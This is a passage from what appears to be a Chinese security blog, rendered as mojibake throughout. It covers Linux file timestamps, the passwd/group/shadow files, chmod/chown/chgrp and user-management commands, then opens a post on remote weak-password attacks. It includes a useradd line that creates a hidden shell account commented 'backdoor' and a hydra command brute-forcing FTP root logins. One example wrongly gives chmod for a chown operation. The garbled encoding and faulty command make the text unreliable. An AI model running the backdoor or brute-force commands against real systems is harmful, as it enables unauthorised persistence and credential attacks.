timeï¼‰ï¼šctimeæ˜¯åœ¨å†™å…¥æ–‡ä»¶ã€æ›´æ”¹æ‰€æœ‰è€…ã€æƒé™æˆ–é“¾æ¥è®¾ç½®æ—¶éšièŠ‚ç‚¹çš„å†…å®¹æ›´æ”¹è€Œæ›´æ”¹çš„ï¼Œæ˜¯è¯¥æ–‡ä»¶çš„ièŠ‚ç‚¹æœ€åä¸€æ¬¡è¢«ä¿®æ”¹çš„æ—¶é—´ï¼Œé€šè¿‡chmodã€chownå‘½ä»¤ä¿®æ”¹ä¸€æ¬¡æ–‡ä»¶å±æ€§ï¼Œè¿™ä¸ªæ—¶é—´å°±ä¼šæ›´æ–°ã€‚ å¯ä»¥ç”¨statå‘½ä»¤æŸ¥çœ‹ä¸‰ç§æ—¶é—´ï¼Œä¹Ÿå¯ä»¥ç”¨lså‘½ä»¤åŠ å‚æ•° 123ls -lc filename åˆ—å‡ºæ–‡ä»¶çš„ ctime ï¼ˆæœ€åçŠ¶æ€æ›´æ”¹æ—¶é—´ï¼‰ ls -lu filename åˆ—å‡ºæ–‡ä»¶çš„ atimeï¼ˆæœ€åè®¿é—®æ—¶é—´ï¼‰ ls -l filename åˆ—å‡ºæ–‡ä»¶çš„ mtime ï¼ˆæœ€åä¿®æ”¹æ—¶é—´ï¼‰ ä¸‰ä¸ªé‡è¦æ–‡ä»¶/etc/passwdä»¥ä¸‹å›¾ä¸ºä¾‹ /etc/passwdæ–‡ä»¶ä¸­ä¸€è¡Œè®°å½•å¯¹åº”ç€ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯è¡Œè®°å½•åˆè¢«å†’å·(:)åˆ†éš”ä¸º7ä¸ªå­—æ®µï¼Œå…¶æ ¼å¼å’Œå…·ä½“å«ä¹‰å¦‚ä¸‹ï¼š 1ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shell ç”¨æˆ·å(login_name):æ˜¯ä»£è¡¨ç”¨æˆ·è´¦å·çš„å­—ç¬¦ä¸²ã€‚ å£ä»¤(passwd):ä¸€äº›ç³»ç»Ÿä¸­ï¼Œå­˜æ”¾ç€åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ã€‚è™½ç„¶è¿™ä¸ªå­—æ®µå­˜æ”¾çš„åªæ˜¯ç”¨æˆ·å£ä»¤çš„åŠ å¯†ä¸²ï¼Œä¸æ˜¯æ˜æ–‡ï¼Œä½†æ˜¯ç”±äº/etc/passwdæ–‡ä»¶å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œæ‰€ä»¥è¿™ä»æ˜¯ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç°åœ¨è®¸å¤šLinuxç³»ç»Ÿï¼ˆå¦‚SVR4ï¼‰éƒ½ä½¿ç”¨äº†shadowæŠ€æœ¯ï¼ŒæŠŠçœŸæ­£çš„åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—å­˜æ”¾åˆ°/etc/shadowæ–‡ä»¶ä¸­ï¼Œè€Œåœ¨/etc/passwdæ–‡ä»¶çš„å£ä»¤å­—æ®µä¸­åªå­˜æ”¾ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚â€œxâ€æˆ–è€…â€œ*â€ã€‚ ç”¨æˆ·æ ‡è¯†å·(UID):æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œç³»ç»Ÿå†…éƒ¨ç”¨å®ƒæ¥æ ‡è¯†ç”¨æˆ·ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å®ƒä¸ç”¨æˆ·åæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚å¦‚æœå‡ ä¸ªç”¨æˆ·åå¯¹åº”çš„ç”¨æˆ·æ ‡è¯†å·æ˜¯ä¸€æ ·çš„ï¼Œç³»ç»Ÿå†…éƒ¨å°†æŠŠå®ƒä»¬è§†ä¸ºåŒä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯å®ƒä»¬å¯ä»¥æœ‰ä¸åŒçš„å£ä»¤ã€ä¸åŒçš„ä¸»ç›®å½•ä»¥åŠä¸åŒçš„ç™»å½•Shellç­‰ã€‚å–å€¼èŒƒå›´æ˜¯0-65535ã€‚0æ˜¯è¶…çº§ç”¨æˆ·rootçš„æ ‡è¯†å·ï¼Œ1-99ç”±ç³»ç»Ÿä¿ç•™ï¼Œä½œä¸ºç®¡ç†è´¦å·ï¼Œæ™®é€šç”¨æˆ·çš„æ ‡è¯†å·ä»100å¼€å§‹ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªç•Œé™æ˜¯500ã€‚ ç»„æ ‡è¯†å·(GID):å­—æ®µè®°å½•çš„æ˜¯ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€‚å®ƒå¯¹åº”ç€/etc/groupæ–‡ä»¶ä¸­çš„ä¸€æ¡è®°å½•ã€‚ æ³¨é‡Šæ€§æè¿°(users):å­—æ®µè®°å½•ç€ç”¨æˆ·çš„ä¸€äº›ä¸ªäººæƒ…å†µï¼Œä¾‹å¦‚ç”¨æˆ·çš„çœŸå®å§“åã€ç”µè¯ã€åœ°å€ç­‰ï¼Œè¿™ä¸ªå­—æ®µå¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…çš„ç”¨é€”ã€‚åœ¨ä¸åŒçš„Linuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µçš„æ ¼å¼å¹¶æ²¡æœ‰ç»Ÿä¸€ã€‚åœ¨è®¸å¤šLinuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µå­˜æ”¾çš„æ˜¯ä¸€æ®µä»»æ„çš„æ³¨é‡Šæ€§æè¿°æ–‡å­—ï¼Œç”¨åšfingerå‘½ä»¤çš„è¾“å‡ºã€‚ ä¸»ç›®å½•(home_directory):ä¹Ÿå°±æ˜¯ç”¨æˆ·çš„èµ·å§‹å·¥ä½œç›®å½•ï¼Œå®ƒæ˜¯ç”¨æˆ·åœ¨ç™»å½•åˆ°ç³»ç»Ÿä¹‹åæ‰€å¤„çš„ç›®å½•ã€‚åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œå„ç”¨æˆ·çš„ä¸»ç›®å½•éƒ½è¢«ç»„ç»‡åœ¨åŒä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸‹ï¼Œè€Œç”¨æˆ·ä¸»ç›®å½•çš„åç§°å°±æ˜¯è¯¥ç”¨æˆ·çš„ç™»å½•åã€‚å„ç”¨æˆ·å¯¹è‡ªå·±çš„ä¸»ç›®å½•æœ‰è¯»ã€å†™ã€æ‰§è¡Œï¼ˆæœç´¢ï¼‰æƒé™ï¼Œå…¶ä»–ç”¨æˆ·å¯¹æ­¤ç›®å½•çš„è®¿é—®æƒé™åˆ™æ ¹æ®å…·ä½“æƒ…å†µè®¾ç½®ã€‚ ç™»å½•Shell(Shell):ç”¨æˆ·ç™»å½•åï¼Œè¦å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œè´Ÿè´£å°†ç”¨æˆ·çš„æ“ä½œä¼ ç»™å†…æ ¸ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯ç”¨æˆ·ç™»å½•åˆ°ç³»ç»Ÿåè¿è¡Œçš„å‘½ä»¤è§£é‡Šå™¨æˆ–æŸä¸ªç‰¹å®šçš„ç¨‹åºï¼Œå³Shellã€‚Shellæ˜¯ç”¨æˆ·ä¸Linuxç³»ç»Ÿä¹‹é—´çš„æ¥å£ã€‚Linuxçš„Shellæœ‰è®¸å¤šç§ï¼Œæ¯ç§éƒ½æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚å¸¸ç”¨çš„æœ‰sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)ç­‰ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æ ¹æ®ç³»ç»Ÿæƒ…å†µå’Œç”¨æˆ·ä¹ æƒ¯ä¸ºç”¨æˆ·æŒ‡å®šæŸä¸ªShellã€‚å¦‚æœä¸æŒ‡å®šShellï¼Œé‚£ä¹ˆç³»ç»Ÿä½¿ç”¨shä¸ºé»˜è®¤çš„ç™»å½•Shellï¼Œå³è¿™ä¸ªå­—æ®µçš„å€¼ä¸º/bin/shã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¸­è¿˜æœ‰ä¸€äº›é»˜è®¤çš„å¸å·ï¼Œå¦‚daemonã€binç­‰ã€‚è¿™äº›å¸å·æœ‰ç€ç‰¹æ®Šçš„ç”¨é€”ï¼Œä¸€èˆ¬ç”¨äºè¿›è¡Œç³»ç»Ÿç®¡ç†ã€‚è¿™äº›å¸å·çš„å£ä»¤å¤§éƒ¨åˆ†ç”¨ï¼ˆxï¼‰å·è¡¨ç¤ºï¼Œä»£è¡¨å®ƒä»¬ä¸èƒ½åœ¨ç™»å½•æ—¶ä½¿ç”¨ã€‚ 123456binæ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶ sysæ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶ admæ‹¥æœ‰å¸æˆ·æ–‡ä»¶ uucpUUCPä½¿ç”¨ lplpæˆ–lpdå­ç³»ç»Ÿä½¿ç”¨ nobodyNFSä½¿ç”¨ äº†ä¸Šé¢åˆ—å‡ºçš„ä¼ªç”¨æˆ·å¤–ï¼Œè¿˜æœ‰è®¸å¤šæ ‡å‡†çš„ä¼ªç”¨æˆ·ï¼Œä¾‹å¦‚ï¼šaudit,cron,mail,usenetç­‰ï¼Œå®ƒä»¬ä¹Ÿéƒ½å„è‡ªä¸ºç›¸å…³çš„è¿›ç¨‹å’Œæ–‡ä»¶æ‰€éœ€è¦ã€‚ /etc/group /etc/group æ–‡ä»¶æ˜¯ç”¨æˆ·ç»„çš„é…ç½®æ–‡ä»¶ï¼Œå†…å®¹åŒ…æ‹¬ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œå¹¶ä¸”èƒ½æ˜¾ç¤ºå‡ºç”¨æˆ·æ˜¯å½’å±å“ªä¸ªç”¨æˆ·ç»„æˆ–å“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Œå› ä¸ºä¸€ä¸ªç”¨æˆ·å¯ä»¥å½’å±ä¸€ä¸ªæˆ–å¤šä¸ªä¸åŒçš„ç”¨æˆ·ç»„ï¼›åŒä¸€ç”¨ æˆ·ç»„çš„ç”¨æˆ·ä¹‹é—´å…·æœ‰ç›¸ä¼¼çš„ç‰¹å¾ã€‚æ¯”å¦‚æˆ‘ä»¬æŠŠæŸä¸€ç”¨æˆ·åŠ å…¥åˆ°rootç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·å°±å¯ä»¥æµè§ˆrootç”¨æˆ·å®¶ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚æœrootç”¨æˆ·æŠŠæŸä¸ªæ–‡ä»¶ çš„è¯»å†™æ‰§è¡Œæƒé™å¼€æ”¾ï¼Œrootç”¨æˆ·ç»„çš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹æ­¤æ–‡ä»¶ï¼Œå¦‚æœæ˜¯å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚è„šæœ¬ï¼‰ï¼Œrootç”¨æˆ·ç»„çš„ç”¨æˆ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ã€‚ åœ¨/etc/group ä¸­çš„æ¯æ¡è®°å½•åˆ†å››ä¸ªå­—æ®µï¼šç¬¬ä¸€å­—æ®µï¼šç”¨æˆ·ç»„åç§°ï¼›ç¬¬äºŒå­—æ®µï¼šç”¨æˆ·ç»„å¯†ç ï¼›ç¬¬ä¸‰å­—æ®µï¼šGIDç¬¬å››å­—æ®µï¼šç”¨æˆ·åˆ—è¡¨ï¼Œæ¯ä¸ªç”¨æˆ·ä¹‹é—´ç”¨,å·åˆ†å‰²ï¼›æœ¬å­—æ®µå¯ä»¥ä¸ºç©ºï¼›å¦‚æœå­—æ®µä¸ºç©ºè¡¨ç¤ºç”¨æˆ·ç»„ä¸ºGIDçš„ç”¨æˆ·åï¼› /etc/shadowå¦‚ä¸‹ä¾‹å­ï¼š ç¬¬ä¸€åˆ—ä¸ºè´¦æˆ·åç§° ç¬¬äºŒåˆ—ä¸ºå¯†ç ï¼ˆè´¦æˆ·æœªè®¾ç½®å¯†ç æ—¶ä¸º!!ï¼Œè®¾ç½®å¯†ç ååŠ å¯†æ˜¾ç¤ºï¼‰ ç¬¬ä¸‰åˆ—ä¸ºä¸Šæ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´è·ç¦»1970å¹´01æœˆ01æ—¥å¤šå°‘å¤© ç¬¬å››åˆ—ä¸ºå¯†ç æœ€çŸ­æœ‰æ•ˆå¤©æ•°ï¼Œ0è¡¨ç¤ºæ— é™åˆ¶ ç¬¬äº”åˆ—ä¸ºå¯†ç æœ€é•¿æœ‰æ•ˆå¤©æ•°ï¼ˆé»˜è®¤ä½99999å¤©ï¼Œå¯ä»¥ç†è§£ä¸ºæ°¸ä¸è¿‡æœŸï¼‰ ç¬¬å…­åˆ—ä¸ºå¯†ç è¿‡æœŸåçš„å®½é™å¤©æ•°ï¼ˆå¯†ç è¿‡æœŸåï¼Œé¢„ç•™å‡ å¤©ç»™è´¦å·ä¿®æ”¹å¯†ç ï¼Œæ­¤æ—¶å·²æ— æ³•ä½¿ç”¨æ—§å¯†ç ç™»å½•ï¼‰ ç¬¬å…«åˆ—ä¸ºè´¦æˆ·å¤±æ•ˆæ—¥æœŸï¼ˆä»1970å¹´01æœˆ01æ—¥èµ·å¤šå°‘å¤©åè´¦æˆ·å¤±æ•ˆï¼‰ ç¬¬ä¹åˆ—æš‚æ—¶ä¿ç•™æœªä½¿ç”¨ ç”±ç¤ºä¾‹å¯çŸ¥ï¼ŒåŠ å¯†çš„å¯†ç å…·æœ‰å›ºå®šæ ¼å¼ï¼š 1$id$salt$encrypted idè¡¨ç¤ºåŠ å¯†ç®—æ³•ï¼Œ1ä»£è¡¨MD5ï¼Œ5ä»£è¡¨SHA-256ï¼Œ6ä»£è¡¨SHA-512 saltè¡¨ç¤ºå¯†ç å­¦ä¸­çš„Salt,ç³»ç»Ÿéšæœºç”Ÿæˆ encryptedè¡¨ç¤ºå¯†ç çš„hash ä¸‰ä¸ªé‡è¦å‘½ä»¤chmodLinux/Unix çš„æ–‡ä»¶è°ƒç”¨æƒé™åˆ†ä¸ºä¸‰çº§ : æ–‡ä»¶æ‹¥æœ‰è€…ã€ç¾¤ç»„ã€å…¶ä»–ã€‚åˆ©ç”¨ chmod å¯ä»¥è—‰ä»¥æ§åˆ¶æ–‡ä»¶å¦‚ä½•è¢«ä»–äººæ‰€è°ƒç”¨ã€‚ ä½¿ç”¨æƒé™ : æ‰€æœ‰ä½¿ç”¨è€… è¯­æ³•1chmod [-cfvR] [--help] [--version] mode file... å‚æ•°è¯´æ˜mode : æƒé™è®¾å®šå­—ä¸²ï¼Œæ ¼å¼å¦‚ä¸‹ : 1[ugoa...][[+-&#x3D;][rwxX]...][,...] å…¶ä¸­ï¼š u è¡¨ç¤ºè¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…ï¼Œg è¡¨ç¤ºä¸è¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…å±äºåŒä¸€ä¸ªç¾¤ä½“(group)è€…ï¼Œo è¡¨ç¤ºå…¶ä»–ä»¥å¤–çš„äººï¼Œa è¡¨ç¤ºè¿™ä¸‰è€…çš†æ˜¯ã€‚ + è¡¨ç¤ºå¢åŠ æƒé™ã€- è¡¨ç¤ºå–æ¶ˆæƒé™ã€= è¡¨ç¤ºå”¯ä¸€è®¾å®šæƒé™ã€‚ r è¡¨ç¤ºå¯è¯»å–ï¼Œw è¡¨ç¤ºå¯å†™å…¥ï¼Œx è¡¨ç¤ºå¯æ‰§è¡Œï¼ŒX è¡¨ç¤ºåªæœ‰å½“è¯¥æ–‡ä»¶æ˜¯ä¸ªå­ç›®å½•æˆ–è€…è¯¥æ–‡ä»¶å·²ç»è¢«è®¾å®šè¿‡ä¸ºå¯æ‰§è¡Œã€‚ å…¶ä»–å‚æ•°è¯´æ˜ -c : è‹¥è¯¥æ–‡ä»¶æƒé™ç¡®å®å·²ç»æ›´æ”¹ï¼Œæ‰æ˜¾ç¤ºå…¶æ›´æ”¹åŠ¨ä½œ -f : è‹¥è¯¥æ–‡ä»¶æƒé™æ— æ³•è¢«æ›´æ”¹ä¹Ÿä¸è¦æ˜¾ç¤ºé”™è¯¯è®¯æ¯ -v : æ˜¾ç¤ºæƒé™å˜æ›´çš„è¯¦ç»†èµ„æ–™ -R : å¯¹ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•è¿›è¡Œç›¸åŒçš„æƒé™å˜æ›´(å³ä»¥é€’å›çš„æ–¹å¼é€ä¸ªå˜æ›´) â€“help : æ˜¾ç¤ºè¾…åŠ©è¯´æ˜ â€“version : æ˜¾ç¤ºç‰ˆæœ¬ chownLinux/Unix æ˜¯å¤šäººå¤šå·¥æ“ä½œç³»ç»Ÿï¼Œæ‰€æœ‰çš„æ–‡ä»¶çš†æœ‰æ‹¥æœ‰è€…ã€‚åˆ©ç”¨ chown å°†æŒ‡å®šæ–‡ä»¶çš„æ‹¥æœ‰è€…æ”¹ä¸ºæŒ‡å®šçš„ç”¨æˆ·æˆ–ç»„ï¼Œç”¨æˆ·å¯ä»¥æ˜¯ç”¨æˆ·åæˆ–è€…ç”¨æˆ·IDï¼›ç»„å¯ä»¥æ˜¯ç»„åæˆ–è€…ç»„IDï¼›æ–‡ä»¶æ˜¯ä»¥ç©ºæ ¼åˆ†å¼€çš„è¦æ”¹å˜æƒé™çš„æ–‡ä»¶åˆ—è¡¨ï¼Œæ”¯æŒé€šé…ç¬¦ã€‚ ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæŒ‡ä»¤åªæœ‰æ˜¯ç”±ç³»ç»Ÿç®¡ç†è€…(root)æ‰€ä½¿ç”¨ï¼Œä¸€èˆ¬ä½¿ç”¨è€…æ²¡æœ‰æƒé™å¯ä»¥æ”¹å˜åˆ«äººçš„æ–‡ä»¶æ‹¥æœ‰è€…ï¼Œä¹Ÿæ²¡æœ‰æƒé™å¯ä»¥è‡ªå·±çš„æ–‡ä»¶æ‹¥æœ‰è€…æ”¹è®¾ä¸ºåˆ«äººã€‚åªæœ‰ç³»ç»Ÿç®¡ç†è€…(root)æ‰æœ‰è¿™æ ·çš„æƒé™ã€‚ ä½¿ç”¨æƒé™ : root è¯­æ³•1chown [-cfhvR] [--help] [--version] user[:group] file... å‚æ•° user : æ–°çš„æ–‡ä»¶æ‹¥æœ‰è€…çš„ä½¿ç”¨è€… ID group : æ–°çš„æ–‡ä»¶æ‹¥æœ‰è€…çš„ä½¿ç”¨è€…ç¾¤ä½“(group) -c : è‹¥è¯¥æ–‡ä»¶æ‹¥æœ‰è€…ç¡®å®å·²ç»æ›´æ”¹ï¼Œæ‰æ˜¾ç¤ºå…¶æ›´æ”¹åŠ¨ä½œ -f : è‹¥è¯¥æ–‡ä»¶æ‹¥æœ‰è€…æ— æ³•è¢«æ›´æ”¹ä¹Ÿä¸è¦æ˜¾ç¤ºé”™è¯¯è®¯æ¯ -h : åªå¯¹äºè¿ç»“(link)è¿›è¡Œå˜æ›´ï¼Œè€Œéè¯¥ link çœŸæ­£æŒ‡å‘çš„æ–‡ä»¶ -v : æ˜¾ç¤ºæ‹¥æœ‰è€…å˜æ›´çš„è¯¦ç»†èµ„æ–™ -R : å¯¹ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•è¿›è¡Œç›¸åŒçš„æ‹¥æœ‰è€…å˜æ›´(å³ä»¥é€’å›çš„æ–¹å¼é€ä¸ªå˜æ›´) â€“help : æ˜¾ç¤ºè¾…åŠ©è¯´æ˜ â€“version : æ˜¾ç¤ºç‰ˆæœ¬ å®ä¾‹å°†æ–‡ä»¶ file1.txt çš„æ‹¥æœ‰è€…è®¾ä¸º users ç¾¤ä½“çš„ä½¿ç”¨è€… jessie : 1chown jessie:users file1.txt å°†ç›®å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•çš„æ‹¥æœ‰è€…çš†è®¾ä¸º users ç¾¤ä½“çš„ä½¿ç”¨è€… lamport : 1chmod -R lamport:users * chgrpLinux chgrpå‘½ä»¤ç”¨äºå˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„ã€‚ åœ¨UNIXç³»ç»Ÿå®¶æ—é‡Œï¼Œæ–‡ä»¶æˆ–ç›®å½•æƒé™çš„æŒæ§ä»¥æ‹¥æœ‰è€…åŠæ‰€å±ç¾¤ç»„æ¥ç®¡ç†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨chgrpæŒ‡ä»¤å»å˜æ›´æ–‡ä»¶ä¸ç›®å½•çš„æ‰€å±ç¾¤ç»„ï¼Œè®¾ç½®æ–¹å¼é‡‡ç”¨ç¾¤ç»„åç§°æˆ–ç¾¤ç»„è¯†åˆ«ç çš†å¯ã€‚ è¯­æ³•1chgrp [-cfhRv][--help][--version][æ‰€å±ç¾¤ç»„][æ–‡ä»¶æˆ–ç›®å½•...] æˆ– chgrp [-cfhRv][--help][--reference&#x3D;&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt;][--version][æ–‡ä»¶æˆ–ç›®å½•...] å‚æ•°è¯´æ˜-cæˆ–â€“changes æ•ˆæœç±»ä¼¼â€-vâ€å‚æ•°ï¼Œä½†ä»…å›æŠ¥æ›´æ”¹çš„éƒ¨åˆ†ã€‚ -fæˆ–â€“quietæˆ–â€“silent ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚ -hæˆ–â€“no-dereference åªå¯¹ç¬¦å·è¿æ¥çš„æ–‡ä»¶ä½œä¿®æ”¹ï¼Œè€Œä¸æ›´åŠ¨å…¶ä»–ä»»ä½•ç›¸å…³æ–‡ä»¶ã€‚ -Ræˆ–â€“recursive é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚ -væˆ–â€“verbose æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚ â€“help åœ¨çº¿å¸®åŠ©ã€‚ â€“reference=&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt; æŠŠæŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„å…¨éƒ¨è®¾æˆå’Œå‚è€ƒæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„ç›¸åŒã€‚ â€“version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å®ä¾‹å®ä¾‹1ï¼šæ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„å±æ€§ï¼š 1chgrp -v bin log2012.log è¾“å‡ºï¼š 123[root@localhost test]# ll---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chgrp -v bin log2012.log â€œlog2012.logâ€ çš„æ‰€å±ç»„å·²æ›´æ”¹ä¸º bin 12[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log è¯´æ˜ï¼š å°†log2012.logæ–‡ä»¶ç”±rootç¾¤ç»„æ”¹ä¸ºbinç¾¤ç»„ å®ä¾‹2ï¼šæ ¹æ®æŒ‡å®šæ–‡ä»¶æ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„å±æ€§ 1chgrp --reference&#x3D;log2012.log log2013.log è¾“å‡ºï¼š 1234567[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log[root@localhost test]# chgrp --reference&#x3D;log2012.log log2013.log [root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log è¯´æ˜ï¼š æ”¹å˜æ–‡ä»¶log2013.log çš„ç¾¤ç»„å±æ€§ï¼Œä½¿å¾—æ–‡ä»¶log2013.logçš„ç¾¤ç»„å±æ€§å’Œå‚è€ƒæ–‡ä»¶log2012.logçš„ç¾¤ç»„å±æ€§ç›¸åŒ ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤åˆ›å»ºä¸€ä¸ªç”¨æˆ· åˆ›å»ºä¸€ä¸ªåä¸ºshellçš„ç”¨æˆ·ï¼Œä¸åˆ›å»ºå®¶ç›®å½•ï¼Œshellä¸º/bin/bashï¼ŒæŒ‡å®šUIDå·ä¸º8888ï¼Œæ³¨é‡Šä¸ºbackdoor 1useradd -c &quot;backdoor&quot; -M -s /bin/bash -u 8888 shell è¯¦ç»†å‚æ•°ä¿¡æ¯ï¼š -g æŒ‡å®šæ‰€å±ç»„ -u æŒ‡å®šUIDå· -s æŒ‡å®šç™»å½•çš„shell -d æŒ‡å®šå®¶ç›®å½• -G æŒ‡å®šå±äºå¤šä¸ªç»„ï¼ˆé™„å±ç»„ï¼‰ -M æŒ‡å®šä¸åˆ›å»ºå®¶ç›®å½• -m æŒ‡å®šåˆ›å»ºå®¶ç›®å½• -e è´¦å·ç»ˆæ­¢æ—¥æœŸï¼Œæ—¥æœŸæŒ‡å®šçš„æ ¼å¼ä¸ºMM/DD/YY -f è´¦å·è¿‡æœŸå‡ æ—¥åæ°¸ä¹…åœæƒã€‚å½“å€¼ä¸º0æ—¶è´¦å·ç«‹å³åœæƒï¼Œä¸º-1æ—¶åˆ™å…³é—­æ­¤åŠŸèƒ½ï¼Œé¢„è®¾å€¼ä¸º-1ã€‚ -c æ³¨é‡Š åˆ é™¤ç”¨æˆ· 1userdel -r admin -r åˆ é™¤ä¸»ç›®å½•å’Œé‚®ä»¶æ±  -f å¼ºåˆ¶åˆ é™¤ï¼Œå³ä½¿ç™»å½•ä¸­ æ›´æ”¹å¯†ç  1echo 123123|passwd --stdin useradmin -n 3 -x 30 -w 7 -i 5 éäº¤äº’å¼ä¿®æ”¹å¯†ç ä¸º123123ï¼Œ3å¤©å†…ä¸èƒ½æ›´æ”¹å¯†ç ï¼Œ30å¤©åè¦æ±‚æ›´æ”¹å¯†ç ï¼Œå¯†ç è¿‡æœŸå‰7å¤©æé†’ï¼Œå¯†ç è¿‡æœŸå5å¤©ç¦ç”¨è´¦å·ã€‚ å‚æ•°ï¼š -l é”å®šç”¨æˆ· -U è§£é™¤ç”¨æˆ·é”å®š -d åˆ é™¤ç”¨æˆ·å¯†ç  -S ï¼ˆå¤§å†™ï¼‰ æŸ¥çœ‹ç”¨æˆ·çŠ¶æ€ -n è¡¨ç¤ºå¤šå°‘å¤©å†…ä¸èƒ½æ›´æ”¹å¯†ç  -x è¡¨ç¤ºå¤šå°‘å¤©ä»¥åè¦æ±‚æ›´æ”¹å¯†ç  -w è¡¨ç¤ºè´¦æˆ·å¯†ç è¿‡æœŸå‰å¤šå°‘å¤©æé†’ -i è¡¨ç¤ºå¯†ç è¿‡æœŸåå¤šå°‘å¤©è´¦å·è¢«ç¦ç”¨ â€“stdin éäº¤äº’å¼ä¿®æ”¹å¯†ç  æ›´æ”¹ç™»é™†shell 1chsh -s /bin/bash apache æ›´æ”¹apacheç”¨æˆ·ç™»å½•shellä¸º/bin/bash å‚æ•°ï¼š -s æŒ‡å®šç™»å½•shell -l æ‰“å°shellåˆ—è¡¨å¹¶é€€å‡º whoå‘½ä»¤ 123who -b #åˆ—å‡ºä¸Šæ¬¡ç³»ç»Ÿå¯åŠ¨æ—¶é—´who -q #åˆ—å‡ºæ‰€æœ‰å·²ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åä¸ç”¨æˆ·æ•°é‡who -u #åˆ—å‡ºå·²ç™»å½•çš„ç”¨æˆ· å‚è€ƒï¼š https://www.cnblogs.com/songgj/p/9115954.html https://blog.csdn.net/a1154490629/article/details/52190801 https://ipcmen.com https://blog.csdn.net/weixin_34010566/article/details/93026151","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://www.m00nback.xyz/tags/linux/"}]},{"title":"è¿œç¨‹å¼±å£ä»¤æ”»å‡»å­¦ä¹ ","slug":"è¿œç¨‹å¼±å£ä»¤æ”»å‡»å­¦ä¹ ","date":"2020-02-26T14:04:00.000Z","updated":"2020-03-24T03:53:22.536Z","comments":true,"path":"2020/02/26/è¿œç¨‹å¼±å£ä»¤æ”»å‡»å­¦ä¹ /","link":"","permalink":"http://www.m00nback.xyz/2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å¼±å£ä»¤æ”»å‡»çš„ä¸€äº›æ–¹å¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å¼±å£ä»¤æ”»å‡»çš„ä¸€äº›æ–¹å¼ï¼ ftphydra1hydra -l root -w 10 -P pass.txt -t 10 -v 